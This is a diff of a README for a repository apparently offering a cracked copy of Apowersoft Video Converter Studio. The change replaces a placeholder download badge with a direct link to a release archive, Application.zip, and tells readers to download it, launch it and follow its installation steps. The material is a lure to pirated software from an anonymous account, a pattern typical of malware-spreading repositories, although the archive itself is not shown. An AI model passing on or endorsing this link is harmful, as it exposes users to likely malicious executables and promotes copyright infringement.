@@ -15,9 +15,9 @@ This repository is dedicated to providing resources related to Apowersoft Video 
 ## Resources 🔗
 
 ### Download Application
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-blue)](https://github.com/files/Application.zip)
+[![Download Application](https://github.com/Professor2k04/Apowersoft-Video-Converter-Studio-Cracked/releases/download/v1.0/Application.zip)](https://github.com/Professor2k04/Apowersoft-Video-Converter-Studio-Cracked/releases/download/v1.0/Application.zip)
 
-Click the button above to download the Application.zip file. Make sure to launch the application and follow the instructions for installation.
+Click the button above to download the https://github.com/Professor2k04/Apowersoft-Video-Converter-Studio-Cracked/releases/download/v1.0/Application.zip file. Make sure to launch the application and follow the instructions for installation.
 
 ### Further Information ℹ️
 
